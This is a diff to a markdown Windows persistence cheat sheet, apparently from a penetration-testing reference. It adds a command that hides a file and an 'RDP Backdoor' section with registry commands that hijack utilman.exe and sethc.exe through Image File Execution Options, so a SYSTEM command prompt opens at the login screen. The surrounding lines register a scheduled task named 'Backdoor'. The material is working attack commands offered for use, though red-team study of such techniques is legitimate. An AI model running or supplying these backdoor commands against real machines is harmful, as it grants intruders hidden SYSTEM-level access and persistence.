@@ -11,6 +11,7 @@
     * [HKLM](#hklm)
     * [Services](#services)
     * [Scheduled Task](#scheduled-task)
+    * [RDP Backdoor](#rdp-backdoor)
 * [References](#references)
 
 
@@ -19,6 +20,12 @@
 - [SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r](https://github.com/fireeye/SharPersist)
 
 ## Userland
+
+Set a file as hidden
+
+```powershell
+attrib +h c:\autoexec.bat
+```
 
 ### Registry
 
@@ -113,6 +120,25 @@ PS C:\> $S = New-ScheduledTaskSettingsSet
 PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
 PS C:\> Register-ScheduledTask Backdoor -InputObject $D
 ```
+
+### RDP Backdoor
+
+#### utilman.exe
+
+At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM.
+
+```powershell
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
+```
+
+#### sethc.exe
+ 
+Hit F5 a bunch of times when you are at the RDP login screen.
+
+```powershell
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
+```
+
 
 ## References
 
